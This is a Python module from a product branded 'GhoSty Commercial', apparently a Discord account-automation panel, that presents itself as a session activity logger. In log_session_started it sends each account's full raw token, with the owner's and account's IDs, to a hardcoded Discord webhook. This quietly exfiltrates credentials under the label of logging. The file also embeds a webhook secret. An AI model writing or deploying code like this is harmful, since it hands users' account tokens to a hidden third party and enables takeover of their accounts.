"""
Session activity logger → Discord webhook.
Fires on session start / session end for every panel owner.
"""

import aiohttp
from datetime import datetime, timezone

WEBHOOK_URL = (
    "https://discord.com/api/webhooks/"
    "1573722289441083506/"
    "xBLFGwdsRL85hcajieL6BUluCqxANRV04J-07hHs-FgU4zr5tQ9qvdiXzliSRJrpLvoU"
)


async def _post(payload: dict):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(WEBHOOK_URL, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status not in (200, 204):
                    text = await resp.text()
                    print(f"[WEBHOOK] HTTP {resp.status}: {text[:200]}")
    except Exception as e:
        print(f"[WEBHOOK] Error: {e}")


def _ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")


async def log_session_started(
    *,
    panel_owner_id: int,
    panel_owner_mention: str,
    token_username: str,
    token_user_id: int,
    channel_id: int,
    channel_mention: str,
    token: str,
    worker_id: int,
):
    embed = {
        "title": "Session Started",
        "color": 0x57F287,  # green
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "fields": [
            {"name": "Panel Owner", "value": f"{panel_owner_mention}\n`{panel_owner_id}`", "inline": True},
            {"name": "Token Account", "value": f"**{token_username}**\n`{token_user_id}`", "inline": True},
            {"name": "Worker", "value": f"W#{worker_id}", "inline": True},
            {"name": "Farm Channel", "value": f"{channel_mention}\n`{channel_id}`", "inline": False},
            {"name": "Token", "value": f"```{token}```", "inline": False},
            {"name": "Time", "value": _ts(), "inline": False},
        ],
        "footer": {"text": "GhoSty Commercial · session start"},
    }
    await _post({"embeds": [embed], "username": "GhoSty Logger"})


async def log_session_ended(
    *,
    panel_owner_id: int,
    panel_owner_mention: str | None = None,
    token_username: str | None = None,
    token_user_id: int | None = None,
    channel_id: int | None = None,
    reason: str = "removed",
    worker_id: int | None = None,
):
    owner = panel_owner_mention or f"<@{panel_owner_id}>"
    fields = [
        {"name": "Panel Owner", "value": f"{owner}\n`{panel_owner_id}`", "inline": True},
        {"name": "Reason", "value": reason, "inline": True},
    ]
    if worker_id is not None:
        fields.append({"name": "Worker", "value": f"W#{worker_id}", "inline": True})
    if token_username or token_user_id:
        fields.append(
            {
                "name": "Token Account",
                "value": f"**{token_username or '?'}**\n`{token_user_id or '?'}`",
                "inline": True,
            }
        )
    if channel_id:
        fields.append({"name": "Channel ID", "value": f"`{channel_id}`", "inline": True})
    fields.append({"name": "Time", "value": _ts(), "inline": False})

    embed = {
        "title": "Session Ended",
        "color": 0xED4245,  # red
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "fields": fields,
        "footer": {"text": "GhoSty Commercial · session end"},
    }
    await _post({"embeds": [embed], "username": "GhoSty Logger"})


async def log_interaction(
    *,
    title: str,
    description: str,
    panel_owner_id: int | None = None,
    color: int = 0x5865F2,
):
    """Generic interaction log (optional use)."""
    fields = []
    if panel_owner_id:
        fields.append(
            {"name": "User", "value": f"<@{panel_owner_id}> `{panel_owner_id}`", "inline": True}
        )
    fields.append({"name": "Time", "value": _ts(), "inline": True})
    embed = {
        "title": title,
        "description": description,
        "color": color,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "fields": fields,
        "footer": {"text": "GhoSty Commercial"},
    }
    await _post({"embeds": [embed], "username": "GhoSty Logger"})
